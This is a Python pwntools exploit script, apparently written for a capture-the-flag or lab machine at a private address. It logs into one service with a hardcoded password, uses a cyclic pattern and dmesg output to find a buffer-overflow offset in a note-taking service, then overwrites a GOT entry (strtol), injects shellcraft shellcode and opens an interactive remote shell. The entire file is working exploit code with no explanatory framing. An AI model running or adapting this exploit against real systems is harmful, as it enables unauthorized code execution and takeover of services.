#!/usr/bin/env python2
# encoding: utf-8
from __future__ import print_function

from pwn import *
#from pwnlib.tubes.remote import remote
#from pwnlib.util import cyclic
#from pwnlib.util.packing import *
import re


PWD = 'R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d'

IP = '192.168.56.101'
level1 = remote(IP, 54311)
level2 = remote(IP, 53121)

level1.sendlineafter(': ', PWD)
level1.recvline()

payload = cyclic(128)

level2.sendline('new')
level2.sendline('new')
level2.sendline('set')
level2.sendline('0')
level2.sendline(payload)
level2.sendline('show')
level2.sendline('1')

level1.sendline('dmesg | tail -1')

data = level1.recvline()
target = re.search('segfault at ([0-9a-fA-F]+) ip', data).group(1)

offset = cyclic_find(target.decode('hex'))
print("Offset:", offset)
offset = 76

payload = "B" * (offset)
#payload += p32(0x08048c25)
#payload += p32(0x8048e94) # list_size
#payload += p32(0x804a3e0) # stdout
#payload += p32(0x8049018) # Note id %d does not exist
payload += p32(0x0804a3a4) # strtol@got
payload2 = "B" * (offset)
#payload2 += p32(0x0804a3a8) # .data

level2 = remote(IP, 53121)
data = level2.recv(2048)
level2.sendline('new')
level2.sendline('new')
level2.sendline('new')
level2.sendline('set')
level2.sendline('2')
level2.sendline(asm(shellcraft.sh()))
(level2.recvuntil('set\n> '))
level2.sendline('set')
level2.sendline('1')
level2.sendline(payload2)
(level2.recvuntil('set\n> '))
level2.sendline('show')
level2.sendline('1')
data = level2.recvuntil('> ')
data = level2.recvuntil('> ')[-7:-3]
print('Addr:', hex(u32(data)))
level2.sendline('set')
level2.sendline('0')
level2.sendline(payload)
(level2.recvuntil('set\n> '))
level2.sendline('set')
level2.sendline('1')
level2.sendline(data)
(level2.recvuntil('set\n> '))
level2.sendline('show')
(level2.recvuntil(': '))
level2.sendline('1')


#data = level2.recv(2048)
#print(data)
level2.interactive()
